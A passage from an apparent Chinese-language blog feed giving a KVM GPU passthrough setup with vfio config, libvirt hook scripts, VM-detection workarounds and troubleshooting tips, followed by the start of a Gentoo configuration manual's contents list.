0000:02:00.0: Adding to iommu group 15<br>[    0.548128] pci 0000:02:00.1: Adding to iommu group 15<br>[    0.548133] pci 0000:02:00.2: Adding to iommu group 15<br>[    0.548136] pci 0000:03:00.0: Adding to iommu group 15<br>[    0.548139] pci 0000:03:04.0: Adding to iommu group 15<br>[    0.548142] pci 0000:03:08.0: Adding to iommu group 15<br>[    0.548144] pci 0000:03:09.0: Adding to iommu group 15<br>[    0.548147] pci 0000:05:00.0: Adding to iommu group 15<br>[    0.548150] pci 0000:06:00.0: Adding to iommu group 15<br>[    0.548153] pci 0000:07:00.0: Adding to iommu group 15<br>[    0.548159] pci 0000:08:00.0: Adding to iommu group 16<br>[    0.548165] pci 0000:09:00.0: Adding to iommu group 17<br>[    0.548289] pci 0000:0a:00.0: Adding to iommu group 18<br>[    0.548297] pci 0000:0a:00.1: Adding to iommu group 19<br>[    0.548306] pci 0000:0a:00.2: Adding to iommu group 20<br>[    0.548314] pci 0000:0a:00.3: Adding to iommu group 21<br>[    0.548320] pci 0000:0b:00.0: Adding to iommu group 22<br>[    0.548326] pci 0000:0c:00.0: Adding to iommu group 23<br>[    0.548332] pci 0000:0c:00.1: Adding to iommu group 24<br>[    0.548338] pci 0000:0c:00.3: Adding to iommu group 25<br>[    0.548344] pci 0000:0c:00.4: Adding to iommu group 26<br>[    0.549234] perf/amd_iommu: Detected AMD IOMMU <span class="hljs-comment">#0 (2 banks, 4 counters/bank).</span><br></code></pre></td></tr></table></figure><p>查看显卡相关信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">shopt</span> -s nullglob<br><span class="hljs-keyword">for</span> g <span class="hljs-keyword">in</span> `find /sys/kernel/iommu_groups/* -maxdepth 0 -<span class="hljs-built_in">type</span> d | <span class="hljs-built_in">sort</span> -V`; <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;IOMMU Group <span class="hljs-variable">$&#123;g##*/&#125;</span>:&quot;</span><br>    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-variable">$g</span>/devices/*; <span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\t<span class="hljs-subst">$(lspci -nns $&#123;d##*/&#125;)</span>&quot;</span><br>    <span class="hljs-keyword">done</span>;<br><span class="hljs-keyword">done</span>;<br><br><span class="hljs-comment"># 结果</span><br><br>IOMMU Group 16:<br>        08:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 10 XL Upstream Port of PCI Express Switch [1002:1478] (rev c1)<br>IOMMU Group 17:<br>        09:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 10 XL Downstream Port of PCI Express Switch [1002:1479]<br>IOMMU Group 18:<br>        0a:00.0 VGA compatible controller [0300]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21 [Radeon RX 6800/6800 XT / 6900 XT] [1002:73bf] (rev c1)<br>IOMMU Group 19:<br>        0a:00.1 Audio device [0403]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21/23 HDMI/DP Audio Controller [1002:ab28]<br>IOMMU Group 20:<br>        0a:00.2 USB controller [0c03]: Advanced Micro Devices, Inc. [AMD/ATI] Device [1002:73a6]<br>IOMMU Group 21:<br>        0a:00.3 Serial bus controller [0c80]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21 USB [1002:73a4]<br></code></pre></td></tr></table></figure><h2 id="2-3-内核模块添加"><a href="#2-3-内核模块添加" class="headerlink" title="2.3 内核模块添加"></a>2.3 内核模块添加</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 配置ids内容</span><br>worisur ~ <span class="hljs-comment"># cat /etc/modprobe.d/vfio.conf</span><br>options vfio-pci ids=1002:73bf,1002:ab28,1002:73a6,1002:73a4,1002:1478,1002:1479<br>options vfio-pci disable_idle_d3=1<br>options vfio-pci disable_vga=1<br></code></pre></td></tr></table></figure><h2 id="2-4-hook-脚本"><a href="#2-4-hook-脚本" class="headerlink" title="2.4 hook 脚本"></a>2.4 hook 脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">worisur /etc/libvirt/hooks <span class="hljs-comment"># cat qemu</span><br><span class="hljs-comment">#!/bin/bash</span><br>OBJECT=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>OPERATION=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$OBJECT</span> == <span class="hljs-string">&quot;miloo&quot;</span> ] || [ <span class="hljs-variable">$OBJECT</span> == <span class="hljs-string">&quot;mod&quot;</span> ] || [ <span class="hljs-variable">$OBJECT</span> == <span class="hljs-string">&quot;work&quot;</span> ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$OPERATION</span>&quot;</span> <span class="hljs-keyword">in</span><br>                <span class="hljs-string">&quot;prepare&quot;</span>)<br>                systemctl start libvirt-nosleep@<span class="hljs-string">&quot;<span class="hljs-variable">$OBJECT</span>&quot;</span>  2&gt;&amp;1 | <span class="hljs-built_in">tee</span> -a /var/log/libvirt/custom_hooks.log<br>                /bin/vfio-startup.sh 2&gt;&amp;1 | <span class="hljs-built_in">tee</span> -a /var/log/libvirt/custom_hooks.log<br>                ;;<br><br>            <span class="hljs-string">&quot;release&quot;</span>)<br>                systemctl stop libvirt-nosleep@<span class="hljs-string">&quot;<span class="hljs-variable">$OBJECT</span>&quot;</span>  2&gt;&amp;1 | <span class="hljs-built_in">tee</span> -a /var/log/libvirt/custom_hooks.log<br>                /bin/vfio-teardown.sh 2&gt;&amp;1 | <span class="hljs-built_in">tee</span> -a /var/log/libvirt/custom_hooks.log<br>                ;;<br>        <span class="hljs-keyword">esac</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs bash">worisur /etc/libvirt/hooks <span class="hljs-comment"># cat vfio-startup.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment"># Helpful to read output when debugging</span><br><span class="hljs-built_in">set</span> -x<br><br>long_delay=10<br>medium_delay=5<br>short_delay=1<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Beginning of startup!&quot;</span><br><br><span class="hljs-keyword">function</span> stop_display_manager_if_running &#123;<br>    <span class="hljs-comment"># Stop dm using systemd</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v systemctl; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">if</span> systemctl is-active --quiet <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>.service&quot;</span> ; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-variable">$1</span> &gt;&gt; /tmp/vfio-store-display-manager<br>            systemctl stop <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>.service&quot;</span><br>        <span class="hljs-keyword">fi</span><br><br>        <span class="hljs-keyword">while</span> systemctl is-active --quiet <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>.service&quot;</span> ; <span class="hljs-keyword">do</span><br>            <span class="hljs-built_in">sleep</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;medium_delay&#125;</span>&quot;</span><br>        <span class="hljs-keyword">done</span><br><br>        <span class="hljs-built_in">return</span><br>    <span class="hljs-keyword">fi</span><br><br>    <span class="hljs-comment"># Stop dm using runit</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v sv; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">if</span> sv status <span class="hljs-variable">$1</span> ; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-variable">$1</span> &gt;&gt; /tmp/vfio-store-display-manager<br>            sv stop <span class="hljs-variable">$1</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">fi</span><br>&#125;<br><br><span class="hljs-comment"># Stop currently running display manager</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -e <span class="hljs-string">&quot;/tmp/vfio-store-display-manager&quot;</span> ; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">rm</span> -f /tmp/vfio-store-display-manager<br><span class="hljs-keyword">fi</span><br><br>stop_display_manager_if_running gdm<br>stop_display_manager_if_running display-manager<br><br><span class="hljs-built_in">sleep</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;medium_delay&#125;</span>&quot;</span><br><br><span class="hljs-comment"># Unbind VTconsoles if currently bound (adapted from https://www.kernel.org/doc/Documentation/fb/fbcon.txt)</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -e <span class="hljs-string">&quot;/tmp/vfio-bound-consoles&quot;</span> ; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">rm</span> -f /tmp/vfio-bound-consoles<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">for</span> (( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++))<br><span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -x /sys/class/vtconsole/vtcon<span class="hljs-variable">$&#123;i&#125;</span>; <span class="hljs-keyword">then</span><br>      <span class="hljs-keyword">if</span> [ `<span class="hljs-built_in">cat</span> /sys/class/vtconsole/vtcon<span class="hljs-variable">$&#123;i&#125;</span>/name | grep -c <span class="hljs-string">&quot;frame buffer&quot;</span>` \<br>           = 1 ]; <span class="hljs-keyword">then</span><br>               <span class="hljs-built_in">echo</span> 0 &gt; /sys/class/vtconsole/vtcon<span class="hljs-variable">$&#123;i&#125;</span>/bind<br>           <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Unbinding console <span class="hljs-variable">$&#123;i&#125;</span>&quot;</span><br>           <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span> &gt;&gt; /tmp/vfio-bound-consoles<br>      <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># Unbind EFI-Framebuffer</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -e <span class="hljs-string">&quot;/tmp/vfio-is-nvidia&quot;</span> ; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">rm</span> -f /tmp/vfio-is-nvidia<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> lsmod | grep <span class="hljs-string">&quot;nvidia&quot;</span> &amp;&gt; /dev/null ; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;true&quot;</span> &gt;&gt; /tmp/vfio-is-nvidia<br>    <span class="hljs-built_in">echo</span> efi-framebuffer.0 &gt; /sys/bus/platform/drivers/efi-framebuffer/unbind<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;End of startup!&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">worisur /etc/libvirt/hooks <span class="hljs-comment"># cat vfio-teardown.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">set</span> -x<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Beginning of teardown!&quot;</span><br><br><span class="hljs-built_in">sleep</span> 10<br><br><span class="hljs-comment"># Restart Display Manager</span><br>input=<span class="hljs-string">&quot;/tmp/vfio-store-display-manager&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> displayManager; <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v systemctl; <span class="hljs-keyword">then</span><br>    systemctl start <span class="hljs-string">&quot;<span class="hljs-variable">$displayManager</span>.service&quot;</span><br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v sv; <span class="hljs-keyword">then</span><br>      sv start <span class="hljs-variable">$displayManager</span><br>    <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span> &lt; <span class="hljs-string">&quot;<span class="hljs-variable">$input</span>&quot;</span><br><br><span class="hljs-comment"># Rebind VT consoles (adapted from https://www.kernel.org/doc/Documentation/fb/fbcon.txt)</span><br>input=<span class="hljs-string">&quot;/tmp/vfio-bound-consoles&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> consoleNumber; <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -x /sys/class/vtconsole/vtcon<span class="hljs-variable">$&#123;consoleNumber&#125;</span>; <span class="hljs-keyword">then</span><br>      <span class="hljs-keyword">if</span> [ `<span class="hljs-built_in">cat</span> /sys/class/vtconsole/vtcon<span class="hljs-variable">$&#123;consoleNumber&#125;</span>/name | grep -c <span class="hljs-string">&quot;frame buffer&quot;</span>` \<br>           = 1 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Rebinding console <span class="hljs-variable">$&#123;consoleNumber&#125;</span>&quot;</span><br>          <span class="hljs-built_in">echo</span> 1 &gt; /sys/class/vtconsole/vtcon<span class="hljs-variable">$&#123;consoleNumber&#125;</span>/bind<br>      <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span> &lt; <span class="hljs-string">&quot;<span class="hljs-variable">$input</span>&quot;</span><br><br><span class="hljs-comment"># Rebind framebuffer for nvidia</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -e <span class="hljs-string">&quot;/tmp/vfio-is-nvidia&quot;</span> ; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;efi-framebuffer.0&quot;</span> &gt; /sys/bus/platform/drivers/efi-framebuffer/bind<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;End of teardown!&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 权限为 kvm 用户 组为 libvirt</span><br>worisur /etc/libvirt/hooks <span class="hljs-comment"># ls -al</span><br>总用量 20<br>drwxr-xr-x 2 miloo libvirt 4096  7月 14 23:35 .<br>drwxr-xr-x 7 root  root    4096  7月 13 01:25 ..<br>-rwxr-xr-x 1 miloo libvirt  622  7月 14 23:32 qemu<br>-rwxr-xr-x 1 miloo libvirt 1981  7月 13 02:06 vfio-startup.sh<br>-rwxr-xr-x 1 miloo libvirt  972  7月 13 02:07 vfio-teardown.sh<br></code></pre></td></tr></table></figure><h2 id="2-5-QEMU-配置"><a href="#2-5-QEMU-配置" class="headerlink" title="2.5 QEMU 配置"></a>2.5 QEMU 配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># /etc/libvirt/libvirtd.conf 修改如下行：</span><br>worisur /etc/libvirt <span class="hljs-comment"># cat libvirtd.conf</span><br>unix_sock_group = <span class="hljs-string">&quot;libvirt&quot;</span><br>unix_sock_rw_perms = <span class="hljs-string">&quot;0770&quot;</span><br>log_filters=<span class="hljs-string">&quot;1:qemu&quot;</span><br>log_outputs=<span class="hljs-string">&quot;1:file:/var/log/libvirt/libvirtd.log&quot;</span><br><br><span class="hljs-comment"># # /etc/libvirt/qemu.conf 修改如下行：</span><br>worisur /etc/libvirt <span class="hljs-comment"># cat qemu.conf</span><br>user = <span class="hljs-string">&quot;miloo&quot;</span><br>group = <span class="hljs-string">&quot;libvirt&quot;</span><br></code></pre></td></tr></table></figure><h1 id="3-直通"><a href="#3-直通" class="headerlink" title="3 直通"></a>3 直通</h1><h2 id="3-1-创建不直通的虚拟机"><a href="#3-1-创建不直通的虚拟机" class="headerlink" title="3.1 创建不直通的虚拟机"></a>3.1 创建不直通的虚拟机</h2><ul><li>下载<a href="https://github.com/virtio-win/virtio-win-pkg-scripts/blob/master/README.md">驱动</a></li><li>芯片组：Q35</li><li>固件：ovmf_code.fd</li></ul><h2 id="3-2-vbios"><a href="#3-2-vbios" class="headerlink" title="3.2 vbios"></a>3.2 vbios</h2><p><a href="http://www.xiaobaixitong.com/help/43692.html">gpuz提取</a></p><p><a href="https://www.techpowerup.com/vgabios/?architecture=&manufacturer=&model=RX+6800+XT&interface=&memType=&memSize=&since=">此处下载</a></p><h2 id="3-3-添加直通设备"><a href="#3-3-添加直通设备" class="headerlink" title="3.3 添加直通设备"></a>3.3 添加直通设备</h2><ol><li>打开虚拟机管理器,把显卡的所有pci部分都添加到虚拟机里面。<blockquote><p>pci设备：1002:73bf,1002:ab28,1002:73a6,1002:73a4,1002:1478,1002:1479</p></blockquote></li><li>启用XML编辑, 在显卡的所有pci设备里面, 在</source>之后添加: <code>&lt;rom bar=&quot;on&quot; file=&quot;vbios路径&quot;/&gt;</code></li><li>把串口,显示协议,信道,usb转接,显卡qxl,触摸板那些东西删掉</li><li>添加你的USB设备,比如鼠标、键盘和USB耳机。</li></ol><h1 id="4-问题解决"><a href="#4-问题解决" class="headerlink" title="4 问题解决"></a>4 问题解决</h1><h2 id="4-1-软件不能运行在虚拟机上-Sorry-this-program-cannot-run-under-a-virtual-machine"><a href="#4-1-软件不能运行在虚拟机上-Sorry-this-program-cannot-run-under-a-virtual-machine" class="headerlink" title="4.1 软件不能运行在虚拟机上(Sorry, this program cannot run under a virtual machine)"></a>4.1 软件不能运行在虚拟机上(Sorry, this program cannot run under a virtual machine)</h2><ul><li>Pass the SMBIOS information to the guest</li><li>Pass the exact host’s CPU model to the guest</li><li>Hide the “hypervisor” feature from the CPU</li><li>In the “features &gt; hyperv” section, add a vendor_id</li><li>In the “features” section, hide kvm.</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">os</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">smbios</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">&#x27;host&#x27;</span>/&gt;</span><br>  ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">os</span>&gt;</span><br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">features</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">hyperv</span>&gt;</span><br>    ...<br>    <span class="hljs-tag">&lt;<span class="hljs-name">vendor_id</span> <span class="hljs-attr">state</span>=<span class="hljs-string">&#x27;on&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;123456789ab&#x27;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">hyperv</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">kvm</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hidden</span> <span class="hljs-attr">state</span>=<span class="hljs-string">&#x27;on&#x27;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hint-dedicated</span> <span class="hljs-attr">state</span>=<span class="hljs-string">&#x27;on&#x27;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">kvm</span>&gt;</span><br>  ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">features</span>&gt;</span><br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">cpu</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">&#x27;host-passthrough&#x27;</span>&gt;</span><br>  ...<br>  <span class="hljs-tag">&lt;<span class="hljs-name">feature</span> <span class="hljs-attr">policy</span>=<span class="hljs-string">&#x27;disable&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;hypervisor&#x27;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">cpu</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="4-2-黑屏-ucsi-cgg-1-0008-ucsi-handle-connector-change-GET-CONNECTOR-STATUS-failed"><a href="#4-2-黑屏-ucsi-cgg-1-0008-ucsi-handle-connector-change-GET-CONNECTOR-STATUS-failed" class="headerlink" title="4.2 黑屏(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)"></a>4.2 黑屏(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)</h2><ul><li><code>ucsi_cgg</code> 为英伟达显卡的 <code>mod</code> 直接屏蔽就好</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/modprobe.d <span class="hljs-comment"># cat blacklist-nvidia-usb.conf</span><br>blacklist ucsi_ccg<br></code></pre></td></tr></table></figure><h2 id="4-2-docker-桥接占用物理网卡导致网络不通的情况"><a href="#4-2-docker-桥接占用物理网卡导致网络不通的情况" class="headerlink" title="4.2 docker 桥接占用物理网卡导致网络不通的情况"></a>4.2 docker 桥接占用物理网卡导致网络不通的情况</h2><ul><li>添加或修改 <code>/etc/docker/daemon.json</code> 将 kvm 的桥接网卡直接赋给 docker</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>  <span class="hljs-string">&quot;bridge&quot;</span>: <span class="hljs-string">&quot;virbr&quot;</span>,<br>  <span class="hljs-string">&quot;default-gateway&quot;</span>: <span class="hljs-string">&quot;*.*.*.*&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>kvm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>kvm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gentoo 配置手册</title>
    <link href="/2022/07/04/2022-07-04.gentoo%E9%85%8D%E7%BD%AE%E6%89%8B%E5%86%8C/"/>
    <url>/2022/07/04/2022-07-04.gentoo%E9%85%8D%E7%BD%AE%E6%89%8B%E5%86%8C/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#1-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">1 准备工作</a><ul><li><a href="#11-%E4%B8%8B%E8%BD%BD">1.1 下载</a></li><li><a href="#12-%E7%BD%91%E7%BB%9C">1.2 网络</a></li><li><a href="#13-%E5%88%86%E5%8C%BA%E6%8C%82%E8%BD%BD">1.3 分区挂载</a></li><li><a href="#14-ssh%E8%BF%9E%E6%8E%A5%E6%9C%80%E5%B0%8F%E5%8C%96%E5%AE%89%E8%A3%85%E7%B3%BB%E7%BB%9F">1.4 ssh连接最小化安装系统</a></li></ul></li><li><a href="#2-%E5%AE%89%E8%A3%85">2 安装</a><ul><li><a href="#21-%E8%A7%A3%E5%8E%8B%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F">2.1 解压基本系统</a></li><li><a href="#22-%E9%95%9C%E5%83%8F%E6%BA%90%E4%B8%8Echroot">2.2 镜像源与chroot</a></li><li><a href="#23-portage%E4%BB%93%E5%BA%93">2.3 portage仓库</a></li><li><a href="#24-profile%E9%80%89%E6%8B%A9">2.4 profile选择</a></li><li><a href="#25-%E5%AE%89%E8%A3%85%E5%86%85%E6%A0%B8%E5%9B%BA%E4%BB%B6">2.5 安装内核、固件</a></li><li><a href="#26-%E9%85%8D%E7%BD%AE%E5%BC%95%E5%AF%BC">2.6 配置引导</a></li><li><a href="#27-%E6%97%B6%E5%8C%BA%E5%AD%97%E7%AC%A6%E9%9B%86%E9%85%8D%E7%BD%AE">2.7 时区、字符集配置</a></li><li><a href="#28-virtualbox-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE">2.8 virtualbox 虚拟机配置</a></li></ul></li><li><a href="#3-use">3 USE</a><ul><li><a href="#31-makeconf">3.1 make.conf</a></li><li><a href="#32-use">3.2 USE</a></li></ul></li><li><a href="#4-tools">4 tools</a><ul><li><a href="#41-%E5%8C%85%E7%AE%A1%E7%90%86">4.1 包管理</a><ul><li><a href="#411-app-portageeix">4.1.1 app-portage&#x2F;eix</a></li></ul></li><li><a href="#42-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">4.2 文件系统</a><ul><li><a href="#421-sys-fslvm2">4.2.1 sys-fs&#x2F;lvm2</a></li><li><a href="#422-ntfs">4.2.2 ntfs</a></li></ul></li><li><a href="#43-de">4.3 DE</a><ul><li><a href="#431-gnome">4.3.1 gnome</a></li></ul></li><li><a href="#44-vitual">4.4 vitual</a><ul><li><a href="#441-virtualbox">4.4.1 virtualbox</a></li><li><a href="#442-kvm">4.4.2 kvm</a></li></ul></li></ul></li><li><a href="#5-%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB">5 系统迁移</a><ul><li><a href="#51-%E6%9D%83%E9%99%90%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D">5.1 权限备份与恢复</a></li><li><a href="#52-%E7%94%A8%E6%88%B7%E7%BB%84">5.2 